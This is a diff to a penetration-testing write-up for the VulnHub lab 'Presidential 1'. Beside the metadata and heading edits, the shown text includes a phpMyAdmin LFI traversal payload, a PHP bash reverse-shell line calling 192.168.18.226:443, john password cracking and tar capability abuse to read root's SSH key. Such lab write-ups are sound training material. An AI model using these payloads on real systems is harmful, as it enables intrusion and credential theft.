@@ -10,19 +10,19 @@ tags:
   - reverse-shell
   - phpmyadmin
   - capabilities
-machine: Presidential 1
+machine: Presidential
 platform: Linux
 difficulty: Medium/Hard
-date_solved: 2026-09-24
-key_techniques:
+date: 2026-09-24
+techniques:
   - phpMyAdmin LFI
   - LFI to RCE
   - tar capability abuse
 cve: []
-initial_vector: Web application and phpMyAdmin
-privilege_escalation: tarS capability abuse to read root's SSH key
+initial vector: Web application and phpMyAdmin
+privilege escalation: tarS capability abuse to read root's SSH key
 author: null
-writeup_url: https://www.vulnhub.com/entry/presidential-1,500/
+source: https://www.vulnhub.com/entry/presidential-1,500/
 ---
 
 - **Presidential 1 machine**: [https://www.vulnhub.com/entry/presidential-1,500/](https://www.vulnhub.com/entry/presidential-1,500/)
@@ -70,6 +70,9 @@ $dbname = "votebox";
 ?>
 ```
 
+## Exploitation
+
+### phpMyAdmin LFI to RCE
 With these credentials we log into phpMyAdmin; checking the version, it turns out to be *4.8.1*, vulnerable to an LFI and RCE according to searchsploit. We look at the RCE and study what it does so we can run it ourselves.
 ```python
 /index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
@@ -97,6 +100,7 @@ Here we can see how to turn the LFI into RCE: if you run a query in the URL abov
 ```php
 select '<?php system("bash -i >& /dev/tcp/192.168.18.226/443 0>&1"); ?>';
 ```
+### Reverse shell and credential cracking
 The page hangs loading, so we can no longer reach phpMyAdmin and we still have possible passwords there. What we'll do is start a listener again and, from the reverse shell, open another reverse shell in the background. We upgrade the TTY.
 ```bash
 script /dev/null -c bash
@@ -118,7 +122,7 @@ john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
 ```
 The john command takes a while (a long while) to crack it. The result is *Stella*, and with this password we can su to *admin* and enter the directory.
 
-### Privilege escalation
+## Privilege escalation
 To escalate privileges we look for SUID files, but find nothing interesting. We move on to capabilities.
 ```bash
 find / -perm -4000 2>/dev/null
